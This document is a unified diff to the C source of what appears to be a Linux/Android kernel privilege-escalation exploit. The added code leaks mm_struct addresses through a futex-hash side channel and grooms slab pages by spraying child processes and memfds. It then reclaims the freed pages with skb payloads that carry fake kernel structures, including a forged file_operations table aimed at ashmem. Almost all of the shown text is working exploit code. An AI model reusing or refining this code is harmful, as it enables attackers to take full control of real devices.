@@ -5,6 +5,11 @@ static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+static int controlled_reclaim_sv[S918_RECLAIM_SOCKET_PAIRS - 1][2];
+static size_t controlled_reclaim_count;
+#endif
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -114,6 +119,29 @@ static void log_mm_slabinfo(const char *stage) {
     pr_warning("mm slabinfo stage=%s entry missing\n", stage);
   }
 }
+
+#endif
+
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+static void touch_mm_slabinfo(void) {
+  FILE *fp = fopen("/proc/slabinfo", "re");
+  if (!fp) {
+    return;
+  }
+  char line[512];
+  unsigned long values[8];
+  while (fgets(line, sizeof(line), fp)) {
+    if (memcmp(line, "mm_struct ", 10)) {
+      continue;
+    }
+    sscanf(line,
+           "mm_struct %lu %lu %lu %lu %lu : tunables %*lu %*lu %*lu : slabdata %lu %lu %lu",
+           &values[0], &values[1], &values[2], &values[3], &values[4],
+           &values[5], &values[6], &values[7]);
+    break;
+  }
+  fclose(fp);
+}
 #endif
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
@@ -163,7 +191,7 @@ int data_alias_uses_slide = 1;
 #endif
 char ashmem_path[256] = "/dev/ashmem";
 
-static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
+void put_fake_waiter(unsigned char *payload, size_t waiter_off,
                             uintptr_t tree_parent, uintptr_t tree_right,
                             uintptr_t tree_left, uintptr_t pi_parent,
                             uintptr_t pi_right, uintptr_t pi_left,
@@ -404,12 +432,22 @@ void log_startup_context(void) {
                "Seccomp_filters=%s", values[0], values[1], values[2]);
     }
   }
+  const char *stack_writer = "pselect";
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+  stack_writer = "mcast";
+#elif defined(SLIDE_STACK_WRITER) && \
+      defined(SLIDE_STACK_WRITER_SIGRETURN) && \
+      SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_SIGRETURN
+  stack_writer = "sigreturn";
+#endif
   pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
              getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
              enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
-             getpid(), BUILD_VARIANT_LABEL);
+  pr_success("build config pid=%d label=%s stack_writer=%s\n",
+             getpid(), BUILD_VARIANT_LABEL, stack_writer);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
@@ -651,6 +689,18 @@ void kill_child(pid_t child) {
 }
 
 void close_reclaim_sockets(void) {
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+  for (size_t pair = 0; pair < controlled_reclaim_count; ++pair) {
+    for (size_t side = 0; side < 2; ++side) {
+      if (controlled_reclaim_sv[pair][side] >= 0) {
+        close(controlled_reclaim_sv[pair][side]);
+        controlled_reclaim_sv[pair][side] = -1;
+      }
+    }
+  }
+  controlled_reclaim_count = 0;
+#endif
   for (int i = 0; i < 2; i++) {
     if (reclaim_sv[i] >= 0) {
       close(reclaim_sv[i]);
@@ -703,6 +753,468 @@ int clone_memfd(void) {
   kill_child(child);
   return fd;
 }
+
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+enum controlled_mm_zone {
+  CONTROLLED_MM_INVALID,
+  CONTROLLED_MM_DMA32,
+  CONTROLLED_MM_NORMAL,
+};
+
+static pid_t clone_controlled_leak_child(
+    struct kernelsnitch_shared_state *state) {
+  pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
+  if (child == 0) {
+    SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
+    if (getppid() == 1) {
+      _exit(2);
+    }
+    kernelsnitch_find_collisions(state);
+    _exit(kernelsnitch_found_collisions(state) ? 0 : 4);
+  }
+  return child;
+}
+
+static enum controlled_mm_zone controlled_mm_zone_of(uintptr_t mm) {
+  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
+
+  if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END) {
+    return CONTROLLED_MM_DMA32;
+  }
+  if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END) {
+    return CONTROLLED_MM_NORMAL;
+  }
+  return CONTROLLED_MM_INVALID;
+}
+
+static const char *controlled_mm_zone_name(enum controlled_mm_zone zone) {
+  if (zone == CONTROLLED_MM_DMA32) {
+    return "dma32";
+  }
+  if (zone == CONTROLLED_MM_NORMAL) {
+    return "normal";
+  }
+  return "invalid";
+}
+
+static int controlled_mm_valid(uintptr_t mm) {
+  uintptr_t base = mm & ~(ORDER3_SIZE - 1);
+  uintptr_t offset = mm - base;
+
+  return controlled_mm_zone_of(mm) != CONTROLLED_MM_INVALID &&
+         offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
+}
+
+static uintptr_t controlled_mm_match_page(
+    const struct kernelsnitch_shared_state *state, uintptr_t base) {
+  uintptr_t found = (uintptr_t)-1;
+  size_t count = 0;
+
+  for (uintptr_t candidate = base; candidate < base + ORDER3_SIZE;
+       candidate += MM_STRUCT_SZ) {
+    size_t hash = futex_hash(state->futex_addrs[0], candidate);
+    size_t matches = 1;
+
+    for (size_t i = 1; i < state->collisions; ++i) {
+      matches += hash == futex_hash(state->futex_addrs[i], candidate);
+    }
+    if (matches == state->collisions) {
+      found = candidate;
+      count++;
+    }
+  }
+  return count == 1 ? found : (uintptr_t)-1;
+}
+
+#if defined(QEMU_MM_TRACE_ORACLE) || defined(QEMU_MM_TRACE_VALIDATE)
+static int qemu_mm_trace_fd = -1;
+
+static int qemu_mm_trace_ready(void) {
+  if (qemu_mm_trace_fd >= 0) {
+    return 1;
+  }
+  const char *value = getenv("QEMU_MM_TRACE_FD");
+  char *end = NULL;
+  long parsed;
+
+  if (!value || !*value) {
+    pr_error("qemu mm trace fd missing\n");
+    return 0;
+  }
+  errno = 0;
+  parsed = strtol(value, &end, 10);
+  if (errno || end == value || *end || parsed < 0 ||
+      fcntl((int)parsed, F_GETFD) < 0) {
+    pr_error("qemu mm trace fd invalid value=%s errno=%d\n", value, errno);
+    return 0;
+  }
+  qemu_mm_trace_fd = (int)parsed;
+  return 1;
+}
+
+static int qemu_mm_trace_drain(void) {
+  char data[16384];
+
+  if (!qemu_mm_trace_ready()) {
+    return 0;
+  }
+  for (;;) {
+    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data));
+    if (size > 0) {
+      continue;
+    }
+    if (size < 0 && errno != EAGAIN && errno != EINTR) {
+      pr_error("qemu mm trace drain errno=%d\n", errno);
+      return 0;
+    }
+    return 1;
+  }
+}
+
+static int qemu_mm_trace_read(uintptr_t *mm_out) {
+  char data[16384];
+  char pid_token[32];
+
+  snprintf(pid_token, sizeof(pid_token), "-%d ", getpid());
+  for (size_t retry = 0; retry < 200; ++retry) {
+    ssize_t size = read(qemu_mm_trace_fd, data, sizeof(data) - 1);
+    if (size < 0) {
+      if (errno == EAGAIN || errno == EINTR) {
+        usleep(1000);
+        continue;
+      }
+      pr_error("qemu mm trace read errno=%d\n", errno);
+      return 0;
+    }
+    if (!size) {
+      usleep(1000);
+      continue;
+    }
+    data[size] = 0;
+    char *line = data;
+    while (line && *line) {
+      char *next = strchr(line, '\n');
+      if (next) {
+        *next++ = 0;
+      }
+      char *event = strstr(line, "kmem_cache_alloc:");
+      char *ptr = event ? strstr(event, " ptr=") : NULL;
+      int mm_callsite = event &&
+          (strstr(event, "call_site=copy_mm+") ||
+           strstr(event, "call_site=mm_alloc+"));
+      if (mm_callsite && ptr && strstr(line, pid_token)) {
+        unsigned long long parsed = 0;
+        if (sscanf(ptr, " ptr=%llx", &parsed) == 1 && parsed) {
+          *mm_out = (uintptr_t)parsed;
+          return 1;
+        }
+      }
+      line = next;
+    }
+  }
+  pr_error("qemu mm trace missed pid=%d\n", getpid());
+  return 0;
+}
+#endif
+
+static int controlled_mm_leak(size_t cpu_count, uintptr_t hint,
+                              uintptr_t *mm_out, int *hint_hit) {
+#ifdef QEMU_MM_TRACE_ORACLE
+  pid_t child;
+  int fd;
+
+  (void)cpu_count;
+  if (!qemu_mm_trace_drain()) {
+    return -1;
+  }
+
+  child = clone_child();
+  fd = open_memfd(child);
+  kill_child(child);
+  if (qemu_mm_trace_read(mm_out)) {
+    *hint_hit = hint && ((*mm_out & ~(ORDER3_SIZE - 1)) == hint);
+    pr_info("qemu mm oracle pid=%d mm=%016zx hint=%d\n",
+            getpid(), *mm_out, *hint_hit);
+    return fd;
+  }
+  close(fd);
+  return -2;
+#else
+  uintptr_t current_hint = hint;
+  size_t collisions = hint ? S918_KSNITCH_HINT_COLLISIONS
+                           : S918_KSNITCH_FULL_COLLISIONS;
+  size_t passes = hint ? 2 : 1;
+
+  *hint_hit = 0;
+  for (size_t pass = 0; pass < passes; ++pass) {
+    struct kernelsnitch_shared_state *state = kernelsnitch_setup(
+        MM_STRUCT_SZ, MM_ORDER, cpu_count, collisions, 0, 0);
+    pid_t child;
+    int fd;
+    int status;
+
+    if (!state) {
+      return -1;
+    }
+    kernelsnitch_set_profile(state, 256, REPEAT_MEASUREMENT, AVERAGE);
+#ifdef QEMU_MM_TRACE_VALIDATE
+    uintptr_t oracle_mm = 0;
+    if (!qemu_mm_trace_drain()) {
+      state->state = KERNELSNITCH_MM_NOT_FOUND;
+      kernelsnitch_cleanup(state);
+      return -1;
+    }
+#endif
+    child = clone_controlled_leak_child(state);
+    fd = open_memfd(child);
+    int child_ok = waitpid(child, &status, 0) == child && WIFEXITED(status) &&
+                   !WEXITSTATUS(status) &&
+                   kernelsnitch_found_collisions(state);
+#ifdef QEMU_MM_TRACE_VALIDATE
+    int oracle_ok = qemu_mm_trace_read(&oracle_mm);
+    if (!child_ok) {
+      pr_info("qemu mm validate collision=0 actual=%016zx trace=%d\n",
+              oracle_mm, oracle_ok);
+    }
+#endif
+    if (!child_ok) {
+      close(fd);
+      state->state = KERNELSNITCH_MM_NOT_FOUND;
+      kernelsnitch_cleanup(state);
+      if (current_hint) {
+        current_hint = 0;
+        collisions = S918_KSNITCH_FULL_COLLISIONS;
+        continue;
+      }
+      return -2;
+    }
+    if (current_hint) {
+      state->mm_struct = controlled_mm_match_page(state, current_hint);
+      if (state->mm_struct == (uintptr_t)-1) {
+        close(fd);
+        state->state = KERNELSNITCH_MM_NOT_FOUND;
+        kernelsnitch_cleanup(state);
+        current_hint = 0;
+        collisions = S918_KSNITCH_FULL_COLLISIONS;
+        continue;
+      }
+      state->found = 1;
+      state->state = KERNELSNITCH_MM_FOUND;
+      *hint_hit = 1;
+    } else {
+      kernelsnitch_bruteforce(state);
+    }
+    if (state->mm_struct == (uintptr_t)-1) {
+      close(fd);
+      kernelsnitch_cleanup(state);
+      return -2;
+    }
+    *mm_out = state->mm_struct;
+#ifdef QEMU_MM_TRACE_VALIDATE
+    pr_info("qemu mm validate ks=%016zx actual=%016zx exact=%d page=%d "
+            "hint=%d\n",
+            *mm_out, oracle_mm, oracle_ok && *mm_out == oracle_mm,
+            oracle_ok && ((*mm_out & ~(ORDER3_SIZE - 1)) ==
+                          (oracle_mm & ~(ORDER3_SIZE - 1))),
+            *hint_hit);
+    if (!oracle_ok || *mm_out != oracle_mm) {
+      close(fd);
+      state->state = KERNELSNITCH_MM_NOT_FOUND;
+      kernelsnitch_cleanup(state);
+      return -2;
+    }
+#endif
+    kernelsnitch_cleanup(state);
+    return fd;
+  }
+  return -2;
+#endif
+}
+
+static int collect_controlled_mm_group(size_t cpu_count, uintptr_t *base_out,
+                                       int *chosen_fds) {
+  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
+  const size_t max_groups = 64;
+  const size_t opaque_capacity = S918_PAGE_SCAN_MAX * batch;
+  uintptr_t *bases = calloc(max_groups, sizeof(*bases));
+  size_t *counts = calloc(max_groups, sizeof(*counts));
+  int *fds = malloc(max_groups * batch * sizeof(*fds));
+  unsigned char *seen = calloc(max_groups * batch, sizeof(*seen));
+  int *opaque = malloc(opaque_capacity * sizeof(*opaque));
+  size_t opaque_count = 0;
+  size_t group_count = 0;
+  size_t chosen = max_groups;
+  uintptr_t hint = 0;
+  unsigned long chosen_attempt = 0;
+  int result = 0;
+
+  if (!bases || !counts || !fds || !seen || !opaque) {
+    SYSCHK(-1);
+  }
+  for (size_t i = 0; i < max_groups * batch; ++i) {
+    fds[i] = -1;
+  }
+  for (size_t i = 0; i < batch; ++i) {
+    chosen_fds[i] = -1;
+  }
+  pr_info("controlled mm group search scans=%d objects=%zu dma32_skip=%d\n",
+          S918_PAGE_SCAN_MAX, batch, S918_DMA32_SKIP_SLABS);
+
+  for (unsigned long attempt = 1;
+       attempt <= S918_PAGE_SCAN_MAX && !result; ++attempt) {
+    uintptr_t mm = 0;
+    uintptr_t base;
+    uintptr_t requested_hint = hint;
+    size_t slot;
+    size_t group = max_groups;
+    int hint_hit;
+    int fd = controlled_mm_leak(cpu_count, hint, &mm, &hint_hit);
+
+    if (fd == -2) {
+      continue;
+    }
+    if (fd < 0) {
+      break;
+    }
+    if (!controlled_mm_valid(mm)) {
+      SYSCHK(close(fd));
+      continue;
+    }
+    if (requested_hint && !hint_hit) {
+      SYSCHK(close(fd));
+      hint = requested_hint;
+      pr_info("controlled mm fallback rejected attempt=%lu hint=%016zx "
+              "candidate=%016zx\n",
+              attempt, requested_hint, mm);
+      continue;
+    }
+    base = mm & ~(ORDER3_SIZE - 1);
+    slot = (mm - base) / MM_STRUCT_SZ;
+    if (controlled_mm_zone_of(base) == CONTROLLED_MM_DMA32) {
+      size_t refs = S918_DMA32_SKIP_SLABS * batch;
+
+      if (opaque_count + refs > opaque_capacity) {
+        SYSCHK(close(fd));
+        break;
+      }
+      opaque[opaque_count++] = fd;
+      pin_to_core(CORE);
+      for (size_t i = 1; i < refs; ++i) {
+        opaque[opaque_count++] = clone_memfd();
+      }
+      pr_info("controlled mm dma32 skip attempt=%lu base=%016zx refs=%zu total=%zu\n",
+              attempt, base, refs, opaque_count);
+      hint = 0;
+      continue;
+    }
+    hint = base;
+    for (size_t i = 0; i < group_count; ++i) {
+      if (bases[i] == base) {
+        group = i;
+        break;
+      }
+    }
+    if (group == max_groups && group_count < max_groups) {
+      group = group_count++;
+      bases[group] = base;
+    }
+    if (group == max_groups || slot >= batch) {
+      SYSCHK(close(fd));
+      continue;
+    }
+    if (seen[group * batch + slot]) {
+      SYSCHK(close(fd));
+      hint = base;
+      pr_info("controlled mm duplicate rejected attempt=%lu group=%zu "
+              "base=%016zx slot=%zu\n",
+              attempt, group, base, slot);
+      continue;
+    }
+    seen[group * batch + slot] = 1;
+    fds[group * batch + slot] = fd;
+    counts[group]++;
+    if (counts[group] == 1 || counts[group] % 8 == 0 ||
+        counts[group] + 1 >= batch) {
+      pr_info("controlled mm group attempt=%lu group=%zu base=%016zx slot=%zu count=%zu hint=%d\n",
+              attempt, group, base, slot, counts[group], hint_hit);
+    }
+    if (counts[group] == batch) {
+      chosen = group;
+      chosen_attempt = attempt;
+      *base_out = base;
+      result = 1;
+    }
+  }
+
+  pin_to_core(CORE);
+  for (size_t group = 0; group < group_count; ++group) {
+    for (size_t slot = 0; slot < batch; ++slot) {
+      int fd = fds[group * batch + slot];
+
+      if (fd < 0) {
+        continue;
+      }
+      if (result && group == chosen) {
+        chosen_fds[slot] = fd;
+        continue;
+      }
+      SYSCHK(close(fd));
+    }
+  }
+  for (size_t i = 0; i < opaque_count; ++i) {
+    SYSCHK(close(opaque[i]));
+  }
+  if (result) {
+    pr_info("controlled mm group full group=%zu base=%016zx attempts=%lu zone=%s\n",
+            chosen, *base_out, chosen_attempt,
+            controlled_mm_zone_name(controlled_mm_zone_of(*base_out)));
+  } else {
+    pr_warning("controlled mm group failed groups=%zu scans=%d\n",
+               group_count, S918_PAGE_SCAN_MAX);
+  }
+  free(opaque);
+  free(seen);
+  free(fds);
+  free(counts);
+  free(bases);
+  return result;
+}
+
+static int drain_controlled_mm_group(int *target_fds) {
+  const size_t batch = ORDER3_SIZE / MM_STRUCT_SZ;
+  const size_t trigger_refs = S918_TRIGGER_SLABS * batch;
+  int *triggers = malloc(trigger_refs * sizeof(*triggers));
+  int s2;
+
+  if (!triggers) {
+    errno = ENOMEM;
+    SYSCHK(-1);
+  }
+  pin_to_core(CORE);
+  for (size_t i = 0; i < trigger_refs; ++i) {
+    triggers[i] = clone_memfd();
+  }
+  s2 = clone_memfd();
+  pr_info("controlled mm trigger ready pages=%d refs=%zu s2=%d cpu=%d\n",
+          S918_TRIGGER_SLABS, trigger_refs, s2, sched_getcpu());
+  for (size_t i = 0; i + 1 < batch; ++i) {
+    SYSCHK(close(target_fds[i]));
+  }
+  usleep(1000 * 1000);
+  for (size_t page = 0; page < S918_TRIGGER_SLABS; ++page) {
+    SYSCHK(close(triggers[page * batch]));
+  }
+  free(triggers);
+  pr_info("controlled mm target tail armed pages=%d refs_held=%zu cpu=%d\n",
+          S918_TRIGGER_SLABS,
+          trigger_refs - S918_TRIGGER_SLABS + 1, sched_getcpu());
+  SYSCHK(fflush(NULL));
+  SYSCHK(close(target_fds[batch - 1]));
+  return 1;
+}
+
+#endif
 
 void prepare_ctxs(void) {
   prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
@@ -815,6 +1327,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   fake_fops = payload_base + FOPS_TABLE_OFF;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
+#if !defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE
     slide_bank_payload_base = payload_base;
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
     p0_gate_page_struct = direct_to_page(base);
@@ -858,6 +1371,10 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #else
     slide_bank_parents[0] = fake_fops;
     slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+#endif
+#else
+    slide_oracle_parent = fake_fops;
+    slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
 #endif
   }
 #endif
@@ -964,7 +1481,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
        */
       put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
 #endif
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE && \
+    (!defined(APP_CLOSED_FOPS_ROUTE) || !APP_CLOSED_FOPS_ROUTE)
 #if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
       memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
       put_slide_bank_entry(
@@ -1000,6 +1518,92 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+static uintptr_t prepare_controlled_kernel_page(int payload_mode) {
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  int *target_fds;
+  uintptr_t base = 0;
+  int sndbuf = S918_SKB_SNDBUF;
+  struct iovec iov;
+  struct msghdr msg;
+
+  close_reclaim_sockets();
+  cleanup_page_prepare_state();
+  mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
+  skb_buf = malloc(SKB_SEND_SIZE);
+  target_fds = calloc(mm_objs_per_slab, sizeof(*target_fds));
+  if (!skb_buf || !target_fds) {
+    errno = ENOMEM;
+    SYSCHK(-1);
+  }
+
+  if (!collect_controlled_mm_group((size_t)cpu_count, &base, target_fds)) {
+    free(target_fds);
+    return 0;
+  }
+  pr_info("controlled mm group selected base=%016zx mode=%d\n",
+          base, payload_mode);
+  if (!prepare_skb_payload(base, payload_mode)) {
+    for (size_t i = 0; i < mm_objs_per_slab; ++i) {
+      if (target_fds[i] >= 0) {
+        SYSCHK(close(target_fds[i]));
+      }
+    }
+    free(target_fds);
+    return 0;
+  }
+
+  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+  SYSCHK(setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF,
+                    &sndbuf, sizeof(sndbuf)));
+  int flags = SYSCHK(fcntl(reclaim_sv[0], F_GETFL, 0));
+  SYSCHK(fcntl(reclaim_sv[0], F_SETFL, flags | O_NONBLOCK));
+  for (size_t pair = 0; pair + 1 < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
+    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0,
+                      controlled_reclaim_sv[pair]));
+    controlled_reclaim_count++;
+    SYSCHK(setsockopt(controlled_reclaim_sv[pair][0], SOL_SOCKET,
+                      SO_SNDBUF, &sndbuf, sizeof(sndbuf)));
+    flags = SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_GETFL, 0));
+    SYSCHK(fcntl(controlled_reclaim_sv[pair][0], F_SETFL,
+                 flags | O_NONBLOCK));
+  }
+
+  memset(&iov, 0, sizeof(iov));
+  iov.iov_base = skb_buf;
+  iov.iov_len = SKB_SEND_SIZE;
+  memset(&msg, 0, sizeof(msg));
+  msg.msg_iov = &iov;
+  msg.msg_iovlen = 1;
+
+  if (!drain_controlled_mm_group(target_fds)) {
+    free(target_fds);
+    return 0;
+  }
+
+  int sent_count = 0;
+  int stop_errno = 0;
+  for (size_t pair = 0; pair < S918_RECLAIM_SOCKET_PAIRS; ++pair) {
+    int sender = pair ? controlled_reclaim_sv[pair - 1][0] : reclaim_sv[0];
+    for (int send_index = 0; send_index < S918_SKB_SENDS; ++send_index) {
+      errno = 0;
+      ssize_t sent = sendmsg(sender, &msg, MSG_DONTWAIT);
+      if (sent != (ssize_t)SKB_SEND_SIZE) {
+        stop_errno = errno;
+        break;
+      }
+      sent_count++;
+    }
+  }
+  free(target_fds);
+  pr_info("controlled skb reclaim sends=%d pairs=%d per_pair=%d stop_errno=%d base=%016zx mode=%d\n",
+          sent_count, S918_RECLAIM_SOCKET_PAIRS, S918_SKB_SENDS,
+          stop_errno, base, payload_mode);
+  return sent_count ? base : 0;
+}
+#endif
+
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static void cleanup_failed_kernel_page(const char *reason) {
   pr_info("kernel page cleanup failure=%s stage=kernelsnitch begin\n", reason);
@@ -1017,12 +1621,19 @@ static void cleanup_failed_kernel_page(const char *reason) {
 #endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
+#if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
+    APP_CONTROLLED_MM_GROUP_RECLAIM
+  return prepare_controlled_kernel_page(payload_mode);
+#endif
   close_reclaim_sockets();
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   cleanup_page_prepare_state();
 #endif
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   skb_buf = malloc(SKB_SEND_SIZE);
   memset(skb_buf, 0x41, SKB_SEND_SIZE);
@@ -1038,6 +1649,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.childs[i] = clone_child();
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -1089,17 +1703,26 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
   }
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     kill_child(pre_ctx.childs[i]);
+    pre_ctx.childs[i] = -1;
   }
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     kill_child(post_ctx.childs[i]);
+    post_ctx.childs[i] = -1;
   }
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     kill_child(spray_ctx.childs[i]);
+    spray_ctx.childs[i] = -1;
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   log_mm_slabinfo("after-child-exit");
 #endif
@@ -1268,6 +1891,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
 #if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
   /*
    * Make the target-release-to-skb-reclaim interval free of stdio flushes.
@@ -1283,6 +1909,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+  size_t early_drain_triggers = 0;
+#ifdef APP_MM_EARLY_DRAIN_TRIGGERS
+  early_drain_triggers = APP_MM_EARLY_DRAIN_TRIGGERS;
+  size_t early_prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  if (early_drain_triggers > early_prepare_slabs) {
+    early_drain_triggers = early_prepare_slabs;
+  }
+  for (size_t i = 0; i < early_drain_triggers; i++) {
+    size_t index = i * mm_objs_per_slab;
+    SYSCHK(close(prepare_ctx.memfds[index]));
+    prepare_ctx.memfds[index] = -1;
+    kill_child(prepare_ctx.childs[index]);
+    prepare_ctx.childs[index] = -1;
+  }
+#if !defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET
+  pr_info("mm early cpu-partial drain triggers=%zu\n", early_drain_triggers);
+#endif
+#endif
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
   for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
     SYSCHK(close(spray_ctx.memfds[i]));
     spray_ctx.memfds[i] = -1;
@@ -1292,7 +1939,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pre_ctx.memfds[target_pre] = -1;
   SYSCHK(close(post_ctx.memfds[0]));
   post_ctx.memfds[0] = -1;
-#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
+#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW) && \
+    (!defined(APP_CLOSED_RECLAIM_QUIET) || !APP_CLOSED_RECLAIM_QUIET)
   pr_info("mm target-neighbor slab queued for late drain\n");
 #endif
   for (size_t i = 0; i < target_pre; i++) {
@@ -1314,9 +1962,17 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   sched_yield();
   sched_yield();
   sched_yield();
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
-  size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+#if defined(APP_CLOSED_SLABINFO_TOUCH) && APP_CLOSED_SLABINFO_TOUCH
+  touch_mm_slabinfo();
+#endif
+  size_t prepare_slabs = prepare_ctx.mm_cnt / mm_objs_per_slab;
+  size_t drain_start = early_drain_triggers;
+  size_t drain_triggers = prepare_slabs - drain_start;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
 #ifdef APP_MM_LATE_DRAIN_TRIGGERS
   drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
@@ -1326,7 +1982,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
 #endif
   for (size_t i = 0; i < drain_triggers; i++) {
-    size_t index = i * mm_objs_per_slab;
+    size_t index = (drain_start + i) * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
